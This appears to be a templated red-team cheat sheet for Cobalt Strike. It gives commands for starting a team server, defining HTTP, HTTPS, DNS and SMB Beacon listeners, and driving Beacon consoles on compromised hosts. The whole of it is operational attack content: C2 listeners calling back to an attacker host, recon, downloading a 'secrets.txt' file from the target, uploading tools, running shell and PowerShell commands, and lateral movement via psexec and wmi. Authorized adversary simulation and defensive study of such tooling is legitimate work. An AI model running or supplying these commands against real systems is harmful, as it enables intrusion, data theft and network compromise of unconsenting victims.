# Cobalt Strike

> Commercial adversary-simulation C2 — start the team server, connect clients, define listeners, generate Beacon payloads, and drive Beacon consoles.

<!-- tags: c2, cobalt-strike, beacon, listener, payload, post-exploit -->

---

## start team server cobalt strike
Start the Cobalt Strike team server bound to your external IP with a shared password.

```bash
./teamserver {{LHOST:ip}} {{PASS:str:TeamServerPass}}
```

<!-- meta: risk=high | phase=post | tags=cobalt-strike,teamserver,setup -->

---

## connect client cobalt strike
Launch the Cobalt Strike client to connect to a team server.

```bash
./cobaltstrike
```

<!-- meta: risk=med | phase=post | tags=cobalt-strike,client,setup -->

---

## create http listener cobalt strike
Aggressor listener block defining an HTTP Beacon listener.

```bash
listener http { set Host "{{LHOST:ip}}"; set Port "{{LPORT:port:80}}"; set BindPort "{{LPORT:port:80}}"; }
```

<!-- meta: risk=high | phase=post | tags=cobalt-strike,listener,http -->

---

## create https listener cobalt strike
Aggressor listener block defining an HTTPS Beacon listener with a certificate.

```bash
listener https { set Host "{{LHOST:ip}}"; set Port "{{LPORT:port:443}}"; set BindPort "{{LPORT:port:443}}"; set Cert "{{INFILE:file:cobalt.store}}"; }
```

<!-- meta: risk=high | phase=post | tags=cobalt-strike,listener,https -->

---

## create dns listener cobalt strike
Aggressor listener block defining a DNS Beacon listener.

```bash
listener dns { set Host "{{TARGET:ip}}"; set Port "{{LPORT:port:53}}"; set BindPort "{{LPORT:port:53}}"; }
```

<!-- meta: risk=high | phase=post | tags=cobalt-strike,listener,dns -->

---

## create smb listener cobalt strike
Aggressor listener block defining an SMB (named-pipe) Beacon listener for P2P linking.

```bash
listener smb { set PipeName "{{PIPE:str:msagent_pipe}}"; }
```

<!-- meta: risk=high | phase=post | tags=cobalt-strike,listener,smb -->

---

## beacon job controls cobalt strike
Common Beacon console job controls — list/kill jobs and adjust sleep interval.

```bash
sleep {{SECONDS:int:60}}; jobs; jobkill {{JOBID:int:0}}
```

<!-- meta: risk=high | phase=post | tags=cobalt-strike,beacon,jobs -->

---

## beacon system info cobalt strike
Beacon situational-awareness commands for the current host.

```bash
whoami; hostname; pwd; ps; netstat
```

<!-- meta: risk=high | phase=post | tags=cobalt-strike,beacon,recon -->

---

## beacon file operations cobalt strike
Beacon commands to list directories and upload/download files.

```bash
ls {{PATH:str:C:\\Users}}; download {{FILE:str:secrets.txt}}; upload {{INFILE:file:tool.exe}}
```

<!-- meta: risk=high | phase=post | tags=cobalt-strike,beacon,files -->

---

## beacon execute commands cobalt strike
Beacon commands to run shell, native, and PowerShell commands on the target.

```bash
shell {{CMD:str:ipconfig /all}}; execute {{FILE:str:C:\\Windows\\System32\\calc.exe}}; powershell {{CMD:str:Get-Process}}
```

<!-- meta: risk=high | phase=post | tags=cobalt-strike,beacon,execution -->

---

## beacon lateral movement cobalt strike
Beacon commands to move laterally via PsExec, WMI, and SMB.

```bash
psexec {{TARGET:ip}} {{LISTENER:str:smb-1}}; wmi {{TARGET:ip}} {{LISTENER:str:smb-1}}
```

<!-- meta: risk=high | phase=post | tags=cobalt-strike,beacon,lateral-movement -->
